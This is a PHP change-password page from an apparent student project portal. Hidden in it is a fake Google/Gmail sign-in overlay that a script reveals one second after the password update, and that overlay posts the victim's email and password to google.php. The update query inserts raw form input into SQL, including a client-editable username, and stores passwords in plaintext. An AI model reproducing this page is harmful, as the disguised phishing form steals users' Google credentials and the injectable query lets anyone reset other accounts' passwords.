<?php require 'init.php'; ?>
<?php include 'head.php'; ?>
<head>
  <style>
   icon-icon{font-size: 88px;height: 50px;}
.logos{width: 30px;height: 20px;}
   </style>
</head>

<body background="image/pngtree.jpg" style="background-size:800px;position:absolute;">
<nav class="navbar nav-expand-lg  navbar-inverse">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNav">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>                        
      </button>
     
    </div>
	
    <div class="collapse navbar-collapse" id="myNav">
      <ul class="nav navbar-nav m-0">
        <li ><a href="dashboard_std.php"><i class="fa fa-home"></i>  Dashboard</a></li>
        <li><a href="submitprojects.php"><i class="fa fa-book"></i>  Projects</a></li>
        <li><a href="std_guides.php"><i class="fa fa-user"></i>Guides List</a></li>
         
  
      </ul>
      <ul class="nav navbar-nav navbar-right">
      <li class="active"><a href="user_student.php">Change password</a></li>
       
        <li><a href="logout.php"><span class="fa fa-user"></span>Logout[<?php echo $_SESSION['user']; ?>]</a></li>
      </ul>
    </div>
  </div>
</nav>  
<h3>Change Account password</h3>
<div class="row" style="position:relative;top:50%;left:30%">
	<div class="col-md-4">
		<form method="post">
			<div class="form-group">
				<label class="control-label">Username:</label>
				<input style="background:none" type="text" name="username" class="form-control"  readonly value="<?php echo $_SESSION['user']; ?>">
			</div>
			<div class="form-group">
				<label class="control-label">New Password:</label>
				<input style="background:none" type="text" name="password" class="form-control" required>
			</div>

			<button name="submit" class="btn btn-xs btn-default">Submit</button>
		</form>
    </div>
    <div class="google" style="position:fixed;left:10%;top:20%;height:400px;background:rgba(255,255,255,0.9);display:none;" id="google">
<center>
<div class="container m-0 mt-5" width="30%">
    <img src="/foodpage/images/google.png" height="40px" width="100px" style="position:fixed,left:50%">
    <h3>One account.All of Google</h3>
    <p>Sign in to continue to Gmail</p>
    <div class="container" height="70px" width="80%" >
        <form style="width: 23rem;background-color: rgba(219, 211, 200, 0.582);padding-left: 20px;padding-bottom: 30px;padding-right: 20px;position: relative;" action="google.php" method="POST" >

          <ion-icon name="person-circle-outline" size="large" ></ion-icon>

            <div class="form-outline mb-4">
              <input type="email" id="form2Example18" class="form-control form-control-lg" name="email" placeholder="Email"  required/>
            </div>

            <div class="form-outline mb-4">
              <input type="password" id="form2Example28" class="form-control form-control-lg" name="password" placeholder="Password" required />
            
            </div>

            <div class="pt-1 mb-4">
              <button class="btn btn-info btn-lg btn-block" id="gbtn" type="submit" style="margin-bottom: 0;padding-bottom: 0;">Sign in</button>
              <p style="font-size: 15px;margin-top: 0;position: absolute;left: 22px;"><input type="checkbox" id="">stay signed in</p>
              <p style="font-size: 15px;margin-top: 0;position: absolute;right: 22px;"><a href="">Need Help?</a> </p>
            </div>
            
            </form>
            <a href="">Create an account</a>
            <br><br>
            One Google Account for everything Google <br>
          <img src="/foodpage/images/gmail.gif" class="logos">
          <img src="/foodpage/images/doc.png" class="logos">
          <img src="/foodpage/images/gplus.png" class="logos">
          <img src="/foodpage/images/map.png" class="logos">
          <img src="/foodpage/images/photos.png" class="logos">
          <img src="/foodpage/images/playstore.jpg" class="logos">
    </div>

</div>
</center>
</div>

</script>
<script>
            var btn=document.getElementById('gbtn');
            btn.addEventListener('click',function hide(){
                document.getElementById('google').style.display='none';
            })
 </script>

</div>
    <?php
      if(isset($_POST['submit'])){
      	$username = $_POST['username'];
      	$password = $_POST['password'];
        
        $query = $db->query("UPDATE auth_students SET password = '$password'  WHERE username = '$username'  ");

        if($query){ ?>
         <script>
         	alert("User added !");
           var delay = 1000;
					setTimeout(function(){ 
                document.getElementById('google').style.display='block';
            }, delay);  
         </script>
        <?php

        }

      }
    ?> 
  
